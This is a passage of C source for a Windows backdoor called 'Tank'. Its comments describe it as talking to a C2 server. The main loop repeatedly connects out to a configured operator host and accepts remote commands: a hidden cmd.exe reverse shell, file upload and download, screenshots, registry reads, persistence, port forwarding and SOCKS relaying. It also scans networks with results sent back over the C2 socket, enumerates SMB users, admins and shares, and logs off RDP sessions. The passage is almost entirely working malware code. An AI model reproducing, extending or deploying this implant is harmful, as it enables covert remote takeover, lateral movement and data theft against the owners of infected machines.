 * cmd_route — IP routing table via iphlpapi (NT4+ / Win98+)
 * ----------------------------------------------------------------------- */
static int cmd_route(SOCKET s)
{
    HMODULE hIP = LoadLibrary("iphlpapi.dll");
    pfGetIpForwardTable fGetRT = hIP ? (pfGetIpForwardTable)GetProcAddress(hIP,"GetIpForwardTable") : NULL;
    char  *buf;
    DWORD  sz;
    char   line[256];
    DWORD  i;

    if (!fGetRT) {
        if (hIP) FreeLibrary(hIP);
        send_str(s,"route: iphlpapi not available (NT<4)\r\n");
        return send_done(s);
    }
    sz=16384; buf=(char *)GlobalAlloc(GMEM_FIXED,sz);
    if (!buf) { if (hIP) FreeLibrary(hIP); return send_done(s); }
    if (fGetRT(buf,&sz,TRUE)==0) {
        IPHLP_IPFWDTABLE *t=(IPHLP_IPFWDTABLE *)buf;
        send_str(s,"Destination     Mask            Gateway         If   Metric\r\n");
        for (i=0; i<t->dwNumEntries; i++) {
            struct in_addr dest,mask,gw;
            char ds[16],ms[16],gs[16];
            dest.s_addr=t->table[i].dwForwardDest;
            mask.s_addr=t->table[i].dwForwardMask;
            gw.s_addr  =t->table[i].dwForwardNextHop;
            lstrcpy(ds,inet_ntoa(dest));
            lstrcpy(ms,inet_ntoa(mask));
            lstrcpy(gs,inet_ntoa(gw));
            wsprintf(line,"%-15s %-15s %-15s %3lu  %6lu\r\n",
                     ds,ms,gs,t->table[i].dwForwardIfIndex,t->table[i].dwForwardMetric1);
            send_str(s,line);
        }
    }
    GlobalFree(buf);
    if (hIP) FreeLibrary(hIP);
    return send_done(s);
}

/* Forward declarations for commands defined later but called from cmd_shell */
static int cmd_smb(SOCKET s, const char *args);
static int cmd_rdp(SOCKET s, const char *args);
static int cmd_scan(SOCKET s, const char *args);

/* -----------------------------------------------------------------------
 * Embedded TCP scanner — cmd_scan
 *
 * Same async select-pool model as gridcli.  Results stream directly back
 * over the C2 socket as TSV so Joshua can capture and hand off to Dumont.
 * No threads; no SERVICES.DAT needed on target; self-contained.
 *
 * Protocol: lines of  HOST\tPORT/tcp\topen\tSERVICE\tBANNER\r\n
 *           terminated with  <<<DONE>>>\n  as usual.
 * ----------------------------------------------------------------------- */

#define SC_POOL_DEF    32
#define SC_POOL_MAX    64    /* must not exceed default FD_SETSIZE (64) */
#define SC_TIMEOUT_DEF 500
#define SC_PORTS_MAX   512

typedef struct {
    SOCKET         sk;
    unsigned long  ip;
    unsigned short port;
    DWORD          deadline;
    int            active;
} ScSlot;

/* Static scan state — reset before each scan                          */
static ScSlot         sc_pool[SC_POOL_MAX];
static unsigned short sc_ports[SC_PORTS_MAX];
static int            sc_nports      = 0;
static int            sc_pool_size   = SC_POOL_DEF;
static int            sc_pool_active = 0;
static int            sc_timeout_ms  = SC_TIMEOUT_DEF;
static unsigned long *sc_hosts       = NULL;
static int            sc_nhosts      = 0;
static int            sc_work_idx    = 0;
static int            sc_work_total  = 0;
static int            sc_done_count  = 0;
static int            sc_banner      = 0;
static SOCKET         sc_c2          = INVALID_SOCKET;

/* Inline service table — avoids SERVICES.DAT dependency on target    */
static const struct { unsigned short p; const char *n; } sc_svcs[] = {
    {21,"ftp"},{22,"ssh"},{23,"telnet"},{25,"smtp"},{53,"domain"},
    {80,"http"},{88,"kerberos"},{110,"pop3"},{111,"rpcbind"},
    {135,"msrpc"},{139,"netbios-ssn"},{143,"imap"},{161,"snmp"},
    {389,"ldap"},{443,"https"},{445,"microsoft-ds"},{514,"rsh"},
    {587,"submission"},{636,"ldaps"},{993,"imaps"},{995,"pop3s"},
    {1080,"socks"},{1433,"ms-sql-s"},{1521,"oracle"},{2049,"nfs"},
    {3306,"mysql"},{3389,"ms-wbt-server"},{4444,"aeldreC2"},
    {5432,"postgresql"},{5900,"vnc"},{6379,"redis"},
    {8080,"http-alt"},{8443,"https-alt"},{27017,"mongod"},{0,NULL}
};

static const char *sc_svc_lookup(unsigned short port)
{
    int i;
    for (i = 0; sc_svcs[i].n; i++)
        if (sc_svcs[i].p == port) return sc_svcs[i].n;
    return "";
}

static void sc_reset(void)
{
    int i;
    for (i = 0; i < SC_POOL_MAX; i++) {
        if (sc_pool[i].active) { closesocket(sc_pool[i].sk); sc_pool[i].active = 0; }
    }
    if (sc_hosts) { free(sc_hosts); sc_hosts = NULL; }
    sc_nhosts = sc_nports = sc_pool_active = 0;
    sc_work_idx = sc_work_total = sc_done_count = 0;
    sc_pool_size  = SC_POOL_DEF;
    sc_timeout_ms = SC_TIMEOUT_DEF;
    sc_banner     = 0;
}

static void sc_host_add(unsigned long ip)
{
    unsigned long *t;
    t = (unsigned long *)realloc(sc_hosts, (size_t)(sc_nhosts + 1) * sizeof(unsigned long));
    if (!t) return;
    sc_hosts = t;
    sc_hosts[sc_nhosts++] = ip;
}

static int sc_parse_target(const char *spec)
{
    char buf[128];
    const char *sl;
    int a, b, c, lo, hi, i;
    unsigned long base;

    strncpy(buf, spec, 127); buf[127] = '\0';
    sl = strchr(buf, '/');
    if (sl) {
        int bits; char ipbuf[64]; unsigned long mask;
        strncpy(ipbuf, buf, (int)(sl - buf)); ipbuf[sl - buf] = '\0';
        bits = atoi(sl + 1);
        if (bits < 1 || bits > 32) return 0;
        base = ntohl(inet_addr(ipbuf));
        if (base == (unsigned long)INADDR_NONE) return 0;
        mask = bits ? (0xFFFFFFFFUL << (32 - bits)) : 0;
        base &= mask;
        for (i = 1; i < (int)(1UL << (32 - bits)) - 1; i++)
            sc_host_add(htonl(base + (unsigned long)i));
        return sc_nhosts > 0;
    }
    if (sscanf(buf, "%d.%d.%d.%d-%d", &a, &b, &c, &lo, &hi) == 5) {
        for (i = lo; i <= hi; i++) {
            char tmp[32]; unsigned long ip;
            sprintf(tmp, "%d.%d.%d.%d", a, b, c, i);
            ip = inet_addr(tmp);
            if (ip != (unsigned long)INADDR_NONE) sc_host_add(ip);
        }
        return sc_nhosts > 0;
    }
    base = inet_addr(buf);
    if (base != (unsigned long)INADDR_NONE) { sc_host_add(base); return 1; }
    { struct hostent *he = gethostbyname(buf);
      if (!he) return 0;
      memcpy(&base, he->h_addr, 4);
      sc_host_add(base); return 1; }
}

static int sc_parse_ports(const char *spec)
{
    const char *p = spec;
    while (*p && sc_nports < SC_PORTS_MAX) {
        char *end; int lo, hi, i;
        lo = (int)strtol(p, &end, 10);
        if (end == p) return 0; p = end;
        if (*p == '-') { p++; hi = (int)strtol(p, &end, 10); if (end == p) return 0; p = end; }
        else hi = lo;
        for (i = lo; i <= hi && sc_nports < SC_PORTS_MAX; i++)
            sc_ports[sc_nports++] = (unsigned short)i;
        if (*p == ',') p++;
    }
    return sc_nports > 0;
}

static void sc_grab_banner(SOCKET sk, char *out, int olen)
{
    fd_set rs; struct timeval tv; int n; char *p;
    out[0] = '\0';
    FD_ZERO(&rs); FD_SET(sk, &rs);
    tv.tv_sec = 0; tv.tv_usec = 300000;
    if (select(0, &rs, NULL, NULL, &tv) <= 0) return;
    n = recv(sk, out, olen - 1, 0);
    if (n <= 0) { out[0] = '\0'; return; }
    out[n] = '\0';
    for (p = out; *p; p++) {
        if (*p == '\r' || *p == '\n') { *p = '\0'; break; }
        if ((unsigned char)*p < 0x20 || (unsigned char)*p > 0x7e) *p = '.';
    }
}

static void sc_slot_open(int i, unsigned long ip, unsigned short port)
{
    SOCKET sk; u_long nb = 1; struct sockaddr_in sa;
    sk = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sk == INVALID_SOCKET) { sc_done_count++; return; }
    ioctlsocket(sk, FIONBIO, &nb);
    memset(&sa, 0, sizeof(sa));
    sa.sin_family      = AF_INET;
    sa.sin_port        = htons(port);
    sa.sin_addr.s_addr = ip;
    connect(sk, (struct sockaddr *)&sa, sizeof(sa));
    sc_pool[i].sk       = sk;
    sc_pool[i].ip       = ip;
    sc_pool[i].port     = port;
    sc_pool[i].deadline = GetTickCount() + (DWORD)sc_timeout_ms;
    sc_pool[i].active   = 1;
    sc_pool_active++;
}

static void sc_slot_close(int i)
{
    if (!sc_pool[i].active) return;
    closesocket(sc_pool[i].sk);
    sc_pool[i].active = 0;
    sc_pool_active--;
    sc_done_count++;
}

static void sc_tick(void)
{
    fd_set wfds, efds; struct timeval tv; int i; DWORD now;

    /* Fill idle slots */
    for (i = 0; i < sc_pool_size && sc_work_idx < sc_work_total; i++) {
        if (!sc_pool[i].active) {
            int hi = sc_work_idx / sc_nports;
            int pi = sc_work_idx % sc_nports;
            sc_slot_open(i, sc_hosts[hi], sc_ports[pi]);
            sc_work_idx++;
        }
    }
    if (sc_pool_active == 0) return;

    FD_ZERO(&wfds); FD_ZERO(&efds);
    for (i = 0; i < sc_pool_size; i++) {
        if (sc_pool[i].active) { FD_SET(sc_pool[i].sk, &wfds); FD_SET(sc_pool[i].sk, &efds); }
    }
    tv.tv_sec = 0; tv.tv_usec = 10000;
    select(0, NULL, &wfds, &efds, &tv);

    now = GetTickCount();
    for (i = 0; i < sc_pool_size; i++) {
        if (!sc_pool[i].active) continue;
        if (FD_ISSET(sc_pool[i].sk, &wfds)) {
            int err = 0, elen = sizeof(err);
            getsockopt(sc_pool[i].sk, SOL_SOCKET, SO_ERROR, (char *)&err, &elen);
            if (err == 0) {
                char banner[81]; char host_str[20]; char line[256];
                struct in_addr ia; ia.s_addr = sc_pool[i].ip;
                strncpy(host_str, inet_ntoa(ia), sizeof(host_str) - 1);
                if (sc_banner) sc_grab_banner(sc_pool[i].sk, banner, 80);
                else banner[0] = '\0';
                sprintf(line, "%s\t%u/tcp\topen\t%s\t%s\r\n",
                        host_str, (unsigned)sc_pool[i].port,
                        sc_svc_lookup(sc_pool[i].port), banner);
                send_str(sc_c2, line);
            }
            sc_slot_close(i);
        } else if (FD_ISSET(sc_pool[i].sk, &efds)) {
            sc_slot_close(i);
        } else if ((long)(now - sc_pool[i].deadline) >= 0) {
            sc_slot_close(i);
        }
    }
}

static int cmd_scan(SOCKET s, const char *args)
{
    /* scan <target> [-p ports] [-t ms] [-T pool] [-b]                */
    char  target[256] = "";
    char  ports_spec[256] = "";
    const char *p;
    int   i;

    sc_reset();
    sc_c2 = s;

    if (!args || !args[0]) {
        send_str(s, "scan: usage: scan <target> [-p ports] [-t ms] [-T pool] [-b]\r\n");
        return send_done(s);
    }

    /* Simple arg parser — first non-flag token is the target         */
    { char tmp[512]; strncpy(tmp, args, 511); tmp[511] = '\0';
      p = tmp;
      while (*p) {
          while (*p == ' ') p++;
          if (*p == '-') {
              char flag = *(p+1); p += 2; while (*p == ' ') p++;
              if (flag == 'p') {
                  i = 0;
                  while (*p && *p != ' ' && i < 255) ports_spec[i++] = *p++;
                  ports_spec[i] = '\0';
              } else if (flag == 't') {
                  sc_timeout_ms = atoi(p); if (sc_timeout_ms < 50) sc_timeout_ms = 50;
                  while (*p && *p != ' ') p++;
              } else if (flag == 'T') {
                  sc_pool_size = atoi(p);
                  if (sc_pool_size < 1) sc_pool_size = 1;
                  if (sc_pool_size > SC_POOL_MAX) sc_pool_size = SC_POOL_MAX;
                  while (*p && *p != ' ') p++;
              } else if (flag == 'b') {
                  sc_banner = 1;
              }
          } else if (!target[0]) {
              i = 0;
              while (*p && *p != ' ' && i < 255) target[i++] = *p++;
              target[i] = '\0';
          } else {
              while (*p && *p != ' ') p++;
          }
      }
    }

    if (!target[0]) {
        send_str(s, "scan: no target specified\r\n"); return send_done(s);
    }
    if (!sc_parse_target(target)) {
        send_str(s, "scan: cannot parse target\r\n"); return send_done(s);
    }

    /* Default ports if none specified                                 */
    if (!ports_spec[0])
        strncpy(ports_spec, "21,22,23,25,53,80,110,135,139,143,389,443,445,1433,3306,3389,5432,5900,8080", 255);
    if (!sc_parse_ports(ports_spec)) {
        send_str(s, "scan: cannot parse port list\r\n"); sc_reset(); return send_done(s);
    }

    sc_work_total = sc_nhosts * sc_nports;
    while (sc_work_idx < sc_work_total || sc_pool_active > 0)
        sc_tick();

    sc_reset();
    return send_done(s);
}

/* -----------------------------------------------------------------------
 * Interactive shell — bidirectional pipe to cmd.exe / COMMAND.COM
 *
 * While in shell mode:
 *   ~.           (on its own line) exits shell and returns to command mode
 *   !sysinfo     routes to the tank's sysinfo command, not the shell
 *   !ps / !ls    similarly for any tank command
 *   everything else goes straight to cmd.exe stdin
 * ----------------------------------------------------------------------- */
static int cmd_shell(SOCKET s, const char *shell_path)
{
    SECURITY_ATTRIBUTES sa;
    STARTUPINFO         si;
    PROCESS_INFORMATION pi;
    HANDLE hRead = INVALID_HANDLE_VALUE, hWrite = INVALID_HANDLE_VALUE;
    HANDLE hProcIn = INVALID_HANDLE_VALUE;
    char   cmdline[MAX_PATH + 8];
    char   outbuf[4096], inbuf[2048];
    DWORD  nread, avail;
    BOOL   alive = TRUE;

    send_str(s,
        "== Yori Shell ==  type ~. alone to exit  |  prefix !cmd for tank commands\r\n");
    {
        char compname[MAX_PATH]; DWORD n = MAX_PATH;
        GetComputerName(compname, &n);
        send_str(s, "Host: "); send_str(s, compname); send_str(s, "\r\n");
    }

    memset(&sa,0,sizeof(sa)); sa.nLength=sizeof(sa); sa.bInheritHandle=TRUE;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        send_str(s, "shell: CreatePipe failed\r\n"); return send_done(s);
    }
    if (!CreatePipe(&hProcIn, NULL, &sa, 0)) {
        /* Create a writable end for shell stdin — use temp name */
        HANDLE hTmpR, hTmpW;
        CreatePipe(&hTmpR, &hTmpW, &sa, 0);
        CloseHandle(hTmpR);
        hProcIn = hTmpW;
    }

    /* Proper piped shell stdin */
    {
        HANDLE hStdinR, hStdinW;
        CloseHandle(hProcIn);
        CreatePipe(&hStdinR, &hStdinW, &sa, 0);
        SetHandleInformation(hStdinW, HANDLE_FLAG_INHERIT, 0);
        hProcIn = hStdinW;

        SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

        wsprintf(cmdline, "%s", shell_path);
        memset(&si,0,sizeof(si)); si.cb=sizeof(si);
        si.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE;
        si.hStdInput=hStdinR; si.hStdOutput=hWrite; si.hStdError=hWrite;
        memset(&pi,0,sizeof(pi));

        if (!CreateProcess(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            send_str(s, "shell: spawn failed\r\n");
            CloseHandle(hRead); CloseHandle(hWrite); CloseHandle(hStdinR); CloseHandle(hStdinW);
            return send_done(s);
        }
        CloseHandle(hWrite); CloseHandle(hStdinR);
        CloseHandle(pi.hThread);
    }

    /* Relay loop */
    while (alive) {
        int got_input = 0;

        /* Check socket for operator input */
        {
            fd_set rset; struct timeval tv;
            FD_ZERO(&rset); FD_SET(s, &rset);
            tv.tv_sec=0; tv.tv_usec=10000;
            if (select(0,&rset,NULL,NULL,&tv)>0 && FD_ISSET(s,&rset)) {
                int n = recv(s, inbuf, sizeof(inbuf)-1, 0);
                if (n <= 0) { alive = FALSE; break; }
                inbuf[n] = '\0';
                /* Exit sequence */
                if (strcmp(inbuf,"~.\r\n")==0 || strcmp(inbuf,"~.\n")==0) break;
                /* Tank command prefix */
                if (inbuf[0] == '!') {
                    /* strip newline, strip leading ! */
                    char tcmd[2048];
                    lstrcpyn(tcmd, inbuf+1, sizeof(tcmd));
                    { int l=lstrlen(tcmd); while(l>0&&(tcmd[l-1]=='\r'||tcmd[l-1]=='\n')) tcmd[--l]='\0'; }
                    if (tcmd[0]) {
                        /* Route to tank command dispatcher — same as run_session */
                        if      (cmd_is(tcmd,"sysinfo"))   cmd_sysinfo(s);
                        else if (cmd_is(tcmd,"ps"))         cmd_ps(s);
                        else if (cmd_is(tcmd,"ls"))         cmd_ls(s, cmd_arg(tcmd,"ls"));
                        else if (cmd_is(tcmd,"cwd"))        cmd_cwd(s);
                        else if (cmd_is(tcmd,"smb"))        cmd_smb(s, cmd_arg(tcmd,"smb"));
                        else if (cmd_is(tcmd,"rdp"))        cmd_rdp(s, cmd_arg(tcmd,"rdp"));
                        else if (cmd_is(tcmd,"scan"))       cmd_scan(s, cmd_arg(tcmd,"scan"));
                        else if (cmd_is(tcmd,"screenshot")) cmd_screenshot(s);
                        else { send_str(s,"!: unknown tank command\r\n"); send_done(s); }
                    }
                    got_input = 1;
                } else {
                    /* Send to shell stdin */
                    WriteFile(hProcIn, inbuf, (DWORD)n, &nread, NULL);
                    got_input = 1;
                }
            }
        }

        /* Read shell stdout */
        avail = 0;
        if (PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) && avail > 0) {
            DWORD want = avail > sizeof(outbuf) ? sizeof(outbuf) : avail;
            if (ReadFile(hRead, outbuf, want, &nread, NULL) && nread > 0)
                send_all(s, outbuf, (int)nread);
        }

        if (WaitForSingleObject(pi.hProcess, 0) == WAIT_OBJECT_0) {
            /* Drain remaining output */
            while (PeekNamedPipe(hRead,NULL,0,NULL,&avail,NULL) && avail>0) {
                DWORD want=avail>sizeof(outbuf)?sizeof(outbuf):avail;
                if (ReadFile(hRead,outbuf,want,&nread,NULL)&&nread>0) send_all(s,outbuf,(int)nread);
                else break;
            }
            send_str(s, "\r\n[shell exited]\r\n");
            alive = FALSE;
        }

        if (!got_input && avail == 0) Sleep(5);
    }

    CloseHandle(hRead);
    CloseHandle(hProcIn);
    if (alive) CloseHandle(pi.hProcess);
    return send_done(s);
}

/* -----------------------------------------------------------------------
 * SMB subcommand: wraps net.exe / nbtstat / cacls with friendly help
 * ----------------------------------------------------------------------- */
static int cmd_smb(SOCKET s, const char *args)
{
    char shell[MAX_PATH];
    char cmdline[512];
    const char *sub, *rest;

    find_shell(shell, MAX_PATH);

    if (!args || !args[0]) {
        send_str(s,
            "SMB / NetBIOS subcommands:\r\n"
            "  smb shares  [\\\\host]        Local or remote share list (net share)\r\n"
            "  smb view    [\\\\host]        Browse remote shares (net view)\r\n"
            "  smb users   [\\\\host]        Local user accounts (net user)\r\n"
            "  smb groups  [\\\\host]        Local groups (net localgroup)\r\n"
            "  smb admins  [\\\\host]        Members of Administrators\r\n"
            "  smb acl     <path>           File/directory ACLs (cacls)\r\n"
            "  smb stat    <ip>             NetBIOS name table (nbtstat -A)\r\n"
            "  smb names                   Local NetBIOS names (nbtstat -n)\r\n"
            "  smb sessions                Active SMB sessions (net session)\r\n"
            "  smb domain                  Domain/workgroup info (net config ws)\r\n"
            "  smb map     \\\\host\\share [u] [p]   Map drive (net use)\r\n"
            "  smb unmap   <drive|*>        Disconnect mapped drive\r\n"
            "\r\n");
        return send_done(s);
    }

    sub  = args;
    rest = strchr(sub, ' ');
    if (rest) rest++; else rest = "";

    if (cmd_is(sub, "shares")) {
        if (rest[0]) wsprintf(cmdline, "net share %s", rest);
        else         lstrcpy(cmdline, "net share");
    } else if (cmd_is(sub, "view")) {
        if (rest[0]) wsprintf(cmdline, "net view %s", rest);
        else         lstrcpy(cmdline, "net view");
    } else if (cmd_is(sub, "users")) {
        if (rest[0]) wsprintf(cmdline, "net user /domain %s", rest);
        else         lstrcpy(cmdline, "net user");
    } else if (cmd_is(sub, "groups")) {
        if (rest[0]) wsprintf(cmdline, "net localgroup %s", rest);
        else         lstrcpy(cmdline, "net localgroup");
    } else if (cmd_is(sub, "admins")) {
        if (rest[0]) wsprintf(cmdline, "net localgroup Administrators %s", rest);
        else         lstrcpy(cmdline, "net localgroup Administrators");
    } else if (cmd_is(sub, "acl")) {
        if (!rest[0]) { send_str(s, "smb acl: need <path>\r\n"); return send_done(s); }
        wsprintf(cmdline, "cacls \"%s\"", rest);
    } else if (cmd_is(sub, "stat")) {
        char ip[64]; char *sp;
        if (!rest[0]) { send_str(s, "smb stat: need <ip>\r\n"); return send_done(s); }
        lstrcpyn(ip, rest, sizeof(ip));
        /* strip \\ prefix */
        sp = ip; while (*sp == '\\') sp++;
        wsprintf(cmdline, "nbtstat -A %s", sp);
    } else if (cmd_is(sub, "names")) {
        lstrcpy(cmdline, "nbtstat -n");
    } else if (cmd_is(sub, "sessions")) {
        lstrcpy(cmdline, "net session");
    } else if (cmd_is(sub, "domain")) {
        lstrcpy(cmdline, "net config workstation");
    } else if (cmd_is(sub, "map")) {
        if (!rest[0]) { send_str(s, "smb map: need \\\\host\\share [user] [pass]\r\n"); return send_done(s); }
        wsprintf(cmdline, "net use * %s", rest);
    } else if (cmd_is(sub, "unmap")) {
        if (!rest[0]) rest = "*";
        wsprintf(cmdline, "net use %s /delete", rest);
    } else {
        send_str(s, "smb: unknown subcommand — type 'smb' alone for help\r\n");
        return send_done(s);
    }

    return exec_command(s, cmdline, shell);
}

/* -----------------------------------------------------------------------
 * RDP subcommand: Terminal Services session enumeration + control
 * NOTE: RDP exists on NT 4.0 Terminal Server Edition (1998) and later.
 *       NT 3.x has RAS (modem dial-in) but not RDP.  We check gracefully.
 * ----------------------------------------------------------------------- */

#pragma pack(1)
typedef struct { DWORD SessionId; LPSTR pWinStationName; int State; } WTS_INFO;
#pragma pack()
typedef BOOL (WINAPI *PFN_WTSEnum)(HANDLE, DWORD, DWORD, WTS_INFO **, DWORD *);
typedef BOOL (WINAPI *PFN_WTSLogoff)(HANDLE, DWORD, BOOL);
typedef VOID (WINAPI *PFN_WTSFree)(PVOID);

static const char *wts_state_str(int st)
{
    static const char *s[] = {
        "Active","Connected","ConnectQuery","Shadow",
        "Disconnected","Idle","Listen","Reset","Down","Init"
    };
    return (st >= 0 && st <= 9) ? s[st] : "?";
}

static int cmd_rdp(SOCKET s, const char *args)
{
    HMODULE         hWts;
    PFN_WTSEnum     pfnEnum;
    PFN_WTSLogoff   pfnLogoff;
    PFN_WTSFree     pfnFree;
    char            line[256];

    if (!args || !args[0]) {
        send_str(s,
            "RDP/Terminal Services subcommands:\r\n"
            "  rdp sessions          List TS/RDP sessions (NT 4 TSE / Win2000+)\r\n"
            "  rdp logoff <id>       Log off session by numeric ID\r\n"
            "Note: RDP requires NT 4.0 Terminal Server Edition or later.\r\n"
            "      NT 3.x has RAS (modem dial-in), not RDP.\r\n\r\n");
        return send_done(s);
    }

    hWts = LoadLibrary("wtsapi32.dll");
    if (!hWts) {
        send_str(s,
            "rdp: wtsapi32.dll not found.\r\n"
            "Terminal Services requires NT 4.0 Terminal Server Edition or Windows 2000+.\r\n"
            "(This system has NT 3.x / Windows 95 / bare NT 4.0 — no RDP server.)\r\n");
        return send_done(s);
    }

    pfnEnum   = (PFN_WTSEnum)  GetProcAddress(hWts, "WTSEnumerateSessionsA");
    pfnLogoff = (PFN_WTSLogoff)GetProcAddress(hWts, "WTSLogoffSession");
    pfnFree   = (PFN_WTSFree)  GetProcAddress(hWts, "WTSFreeMemory");

    if (!pfnEnum || !pfnFree) {
        FreeLibrary(hWts);
        send_str(s, "rdp: WTSEnumerateSessions not available on this system.\r\n");
        return send_done(s);
    }

    if (cmd_is(args, "sessions")) {
        WTS_INFO *sessions = NULL;
        DWORD     count    = 0;
        if (pfnEnum((HANDLE)NULL /*WTS_CURRENT_SERVER_HANDLE=NULL*/, 0, 1,
                    &sessions, &count)) {
            DWORD i;
            send_str(s, "  ID    State           WinStation\r\n");
            send_str(s, "  ----  --------        ----------\r\n");
            for (i = 0; i < count; i++) {
                wsprintf(line, "  %-5lu %-16s  %s\r\n",
                         sessions[i].SessionId,
                         wts_state_str(sessions[i].State),
                         sessions[i].pWinStationName
                             ? sessions[i].pWinStationName : "");
                send_str(s, line);
            }
            wsprintf(line, "\r\n%lu session(s).\r\n", count);
            send_str(s, line);
            pfnFree(sessions);
        } else {
            wsprintf(line, "rdp: WTSEnumerateSessionsA failed (%lu)\r\n", GetLastError());
            send_str(s, line);
        }
    } else if (cmd_is(args, "logoff")) {
        const char *idstr = cmd_arg(args, "logoff");
        DWORD id = (DWORD)atol(idstr);
        if (!idstr[0]) {
            send_str(s, "rdp logoff: need <session_id>\r\n");
        } else if (pfnLogoff && pfnLogoff((HANDLE)NULL, id, FALSE)) {
            wsprintf(line, "Session %lu logged off.\r\n", id);
            send_str(s, line);
        } else {
            wsprintf(line, "rdp logoff: failed (err %lu) — check session ID and permissions.\r\n",
                     GetLastError());
            send_str(s, line);
        }
    } else {
        send_str(s, "rdp: unknown subcommand — type 'rdp' alone for help\r\n");
    }

    FreeLibrary(hWts);
    return send_done(s);
}

/* -----------------------------------------------------------------------
 * Session dispatcher
 * ----------------------------------------------------------------------- */
static void run_session(SOCKET s)
{
    char shell[MAX_PATH], cmd[CMD_BUFSZ], banner[512];
    char compname[MAX_PATH]; DWORD namesz=MAX_PATH;
    OSVERSIONINFO osv; int n, rc;

    find_shell(shell,MAX_PATH);
    compname[0]='\0'; GetComputerName(compname,&namesz);
    memset(&osv,0,sizeof(osv)); osv.dwOSVersionInfoSize=sizeof(osv); GetVersionEx(&osv);
    wsprintf(banner,"Tank/1 host=%s os=%lu.%lu.%lu shell=%s\n",
             compname[0]?compname:"unknown",
             osv.dwMajorVersion,osv.dwMinorVersion,osv.dwBuildNumber,shell);
    send_str(s,banner);

    for(;;) {
        n = recv_line(s,cmd,CMD_BUFSZ);
        if(n<0) return;
        if(n==0) continue;
        if(cmd_is(cmd,"exit")||cmd_is(cmd,"quit")) return;
        else if(cmd_is(cmd,"sysinfo"))    rc=cmd_sysinfo(s);
        else if(cmd_is(cmd,"ps"))         rc=cmd_ps(s);
        else if(cmd_is(cmd,"ls"))         rc=cmd_ls(s,cmd_arg(cmd,"ls"));
        else if(cmd_is(cmd,"get"))        rc=cmd_get(s,cmd_arg(cmd,"get"));
        else if(cmd_is(cmd,"put"))        rc=cmd_put(s,cmd_arg(cmd,"put"));
        else if(cmd_is(cmd,"regq"))       rc=cmd_regq(s,cmd_arg(cmd,"regq"));
        else if(cmd_is(cmd,"screenshot")) rc=cmd_screenshot(s);
        else if(cmd_is(cmd,"portfwd"))    rc=cmd_portfwd(s,cmd_arg(cmd,"portfwd"));
        else if(cmd_is(cmd,"socks4"))     rc=cmd_socks4(s,cmd_arg(cmd,"socks4"));
        else if(cmd_is(cmd,"relaystop"))  rc=cmd_relay_stop(s,cmd_arg(cmd,"relaystop"));
        else if(cmd_is(cmd,"smb"))        rc=cmd_smb(s,cmd_arg(cmd,"smb"));
        else if(cmd_is(cmd,"rdp"))        rc=cmd_rdp(s,cmd_arg(cmd,"rdp"));
        else if(cmd_is(cmd,"cwd"))        rc=cmd_cwd(s);
        else if(cmd_is(cmd,"pwd"))        rc=cmd_cwd(s);
        else if(cmd_is(cmd,"cd"))         rc=cmd_cd(s,cmd_arg(cmd,"cd"));
        else if(cmd_is(cmd,"cat"))        rc=cmd_cat(s,cmd_arg(cmd,"cat"));
        else if(cmd_is(cmd,"less"))       rc=cmd_less(s,cmd_arg(cmd,"less"));
        else if(cmd_is(cmd,"persist"))    rc=cmd_persist(s,cmd_arg(cmd,"persist"));
        else if(cmd_is(cmd,"scan"))       rc=cmd_scan(s,cmd_arg(cmd,"scan"));
        else if(cmd_is(cmd,"env"))        rc=cmd_env(s);
        else if(cmd_is(cmd,"kill"))       rc=cmd_kill(s,cmd_arg(cmd,"kill"));
        else if(cmd_is(cmd,"pinfo"))      rc=cmd_pinfo(s,cmd_arg(cmd,"pinfo"));
        else if(cmd_is(cmd,"resolve"))    rc=cmd_resolve(s,cmd_arg(cmd,"resolve"));
        else if(cmd_is(cmd,"ifconfig"))   rc=cmd_ifconfig(s);
        else if(cmd_is(cmd,"netstat"))    rc=cmd_netstat(s);
        else if(cmd_is(cmd,"route"))      rc=cmd_route(s);
        else if(cmd_is(cmd,"shell"))      rc=cmd_shell(s,shell);
        else                              rc=exec_command(s,cmd,shell);
        if(rc<0) return;
    }
}

/* -----------------------------------------------------------------------
 * Connect + optional TLS handshake
 * ----------------------------------------------------------------------- */
static SOCKET tank_connect(void)
{
    SOCKET             s;
    struct sockaddr_in addr;
    struct hostent    *he;

    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;

    he = gethostbyname(g_clu.host);
    if (!he) { closesocket(s); return INVALID_SOCKET; }

    memset(&addr,0,sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(g_clu.port);
    addr.sin_addr.s_addr = *(DWORD *)he->h_addr;

    if (connect(s,(struct sockaddr*)&addr,sizeof(addr)) == SOCKET_ERROR) {
        closesocket(s); return INVALID_SOCKET;
    }

    if (g_clu.tls && t_tls_avail) {
        if (!tls_handshake(s)) { closesocket(s); return INVALID_SOCKET; }
    }
    return s;
}

/* -----------------------------------------------------------------------
 * WinMain
 * ----------------------------------------------------------------------- */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
    WSADATA wsa;
    SOCKET  s;

    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    if (!recognizer_check()) return 0;

    tls_load();

    if (WSAStartup(MAKEWORD(1,1),&wsa) != 0) return 1;

    for (;;) {
        s = tank_connect();
        if (s != INVALID_SOCKET) {
            run_session(s);
            tls_teardown();
            closesocket(s);
        }
        Sleep(TANK_RETRY_MS);
    }

    WSACleanup();
    return 0;
}
